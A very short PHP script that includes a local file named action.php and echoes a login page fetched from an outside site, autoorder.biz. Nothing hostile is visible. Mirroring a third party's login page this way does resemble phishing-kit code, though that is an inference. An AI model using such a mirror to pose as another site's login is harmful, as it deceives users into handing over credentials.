<?php
include("action.php");

echo file_get_contents("http://autoorder.biz/login/client");
?>
